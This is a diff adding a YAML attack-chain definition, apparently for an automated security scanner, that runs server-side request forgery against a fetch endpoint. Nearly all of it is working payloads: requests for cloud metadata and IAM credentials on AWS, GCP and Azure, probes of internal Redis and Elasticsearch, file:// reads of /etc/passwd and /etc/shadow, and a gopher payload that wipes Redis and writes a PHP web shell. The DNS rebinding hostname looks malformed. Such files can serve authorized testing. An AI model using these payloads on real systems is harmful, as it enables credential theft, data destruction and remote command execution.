@@ -1,0 +1,126 @@
+name: ssrf_chain
+description: SSRF to cloud metadata and internal service attacks
+
+variables:
+  target_param: url
+  webhook_url: ""
+
+steps:
+  - name: test_external
+    request:
+      method: POST
+      url: /api/fetch
+      json:
+        url: "https://httpbin.org/get"
+    extract:
+      response_text: $.data
+    expect:
+      status: 200
+    optional: true
+
+  - name: test_internal
+    request:
+      method: POST
+      url: /api/fetch
+      json:
+        url: "http://127.0.0.1/"
+    expect:
+      status: [200, 403, 500]
+
+attacks:
+  - name: aws_metadata
+    description: Access AWS EC2 metadata
+    type: cloud_ssrf
+    modify_step: test_internal
+    modifications:
+      json.url: "http://169.254.169.254/latest/meta-data/"
+    verify:
+      - request:
+          method: POST
+          url: /api/fetch
+          json:
+            url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        expect:
+          body_contains: "AccessKeyId"
+
+  - name: aws_imds_v2
+    description: AWS IMDSv2 bypass attempt
+    type: imdsv2_ssrf
+    sequence:
+      - request:
+          method: POST
+          url: /api/fetch
+          json:
+            url: "http://169.254.169.254/latest/api/token"
+            method: "PUT"
+            headers:
+              X-aws-ec2-metadata-token-ttl-seconds: "21600"
+
+  - name: gcp_metadata
+    description: Access GCP metadata
+    type: cloud_ssrf
+    modify_step: test_internal
+    modifications:
+      json.url: "http://metadata.google.internal/computeMetadata/v1/"
+      json.headers:
+        Metadata-Flavor: "Google"
+
+  - name: azure_metadata
+    description: Access Azure IMDS
+    type: cloud_ssrf
+    modify_step: test_internal
+    modifications:
+      json.url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      json.headers:
+        Metadata: "true"
+
+  - name: internal_redis
+    description: Attack internal Redis
+    type: internal_service_ssrf
+    modify_step: test_internal
+    modifications:
+      json.url: "http://127.0.0.1:6379/"
+    verify:
+      - request:
+          method: POST
+          url: /api/fetch
+          json:
+            url: "dict://127.0.0.1:6379/INFO"
+        expect:
+          body_contains: "redis_version"
+
+  - name: internal_elasticsearch
+    description: Access internal Elasticsearch
+    type: internal_service_ssrf
+    modify_step: test_internal
+    modifications:
+      json.url: "http://127.0.0.1:9200/_cat/indices"
+
+  - name: file_protocol
+    description: Read local files via file://
+    type: local_file_read
+    modify_step: test_internal
+    modifications:
+      json.url: "file:///etc/passwd"
+    verify:
+      - request:
+          method: POST
+          url: /api/fetch
+          json:
+            url: "file:///etc/shadow"
+        expect:
+          body_contains: "root:"
+
+  - name: gopher_redis
+    description: Redis exploitation via gopher
+    type: gopher_ssrf
+    modify_step: test_internal
+    modifications:
+      json.url: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<?php system($_GET['c']); ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"
+
+  - name: dns_rebinding
+    description: DNS rebinding attack
+    type: dns_rebinding
+    modify_step: test_internal
+    modifications:
+      json.url: "http://a]169.254.169.254.1time.192.168.1.1.forever.rebind.network/"
